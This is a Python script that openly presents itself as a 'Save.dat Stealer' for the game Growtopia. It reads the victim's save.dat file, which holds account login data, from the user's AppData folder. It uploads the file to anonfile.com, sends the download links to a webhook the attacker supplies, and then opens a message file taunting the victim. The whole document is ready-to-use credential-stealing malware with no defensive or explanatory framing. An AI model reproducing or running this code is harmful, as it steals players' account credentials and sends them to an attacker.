# Coded By NumeX
# Credit : https://github.com/znqi/savedatstealer (Idea)

import os
from pathlib import Path
import requests
import json

webhook = "Your Webhook URL"

home = Path.home()
path = str(home)

ff = open('msg.txt', 'w')
ff.write('Your save.dat got hacked by Me. Please be safe next time') # > you can edit whatever you want but iam not responsibled
ff.close()

# Test : '\Desktop\host.txt'
# Save.dat Path : '\AppData\Local\Growtopia\save.dat'

def steal():
	data = {'file': (open(path + '\AppData\Local\Growtopia\save.dat', "rb"))}
	r = requests.post('https://api.anonfile.com/upload', files=data)
	resp = json.loads(r.text)
	if resp['status']:
		urllong = resp['data']['file']['url']['full']
		urlshort = resp['data']['file']['url']['short']
		payload = {'content': f"**Save.dat Stealer By NumeX**\n**URL Long** : `{urllong}`\n**URL Short** : `{urlshort}`"}
		requests.post(webhook, json=payload)
	else:
		message = resp['error']['message']
		errtype = resp['error']['type']
		print(f'[ERROR] {message}\n{errtype}')

if __name__ == "__main__":
	steal()
	os.system('start msg.txt')
